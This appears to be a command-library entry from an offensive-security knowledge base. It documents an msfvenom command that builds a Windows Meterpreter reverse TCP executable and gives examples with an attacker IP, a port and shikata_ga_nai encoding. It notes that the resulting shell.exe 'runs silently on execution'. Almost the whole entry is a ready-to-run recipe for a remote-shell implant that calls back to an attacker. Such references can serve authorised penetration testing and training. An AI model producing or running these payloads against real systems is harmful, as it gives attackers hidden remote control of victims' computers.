---
id: 4bed3964-fe9e-4cc4-8660-ef3dba731b65
name: generate-windows-meterpreter-payload
type: command
executor: bash
data: >-
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f
  exe > shell.exe
output: null
created_at: '2023-04-06T03:56:24.923390+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - Windows
tags:
  - meterpreter
  - reverse-shell
  - exe
verified: true
validated: true
---

# Generate Windows Meterpreter Payload

## Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f exe > shell.exe
```

## Description

Generates an EXE Meterpreter reverse TCP payload for Windows targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker IP | Yes |
| $_LPORT | Attacker port | Yes |
| -p windows/meterpreter/reverse_tcp | Windows Meterpreter payload | Built-in |
| -f exe | PE executable format | Built-in |
| > shell.exe | Save to shell.exe | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f exe > shell.exe
```

### Advanced Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f exe -i 3 -e x86/shikata_ga_nai > shell.exe
```

## Expected Output

shell.exe binary (~38 KB); runs silently on execution.

## Related

- [[commands/generate-asp-meterpreter-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
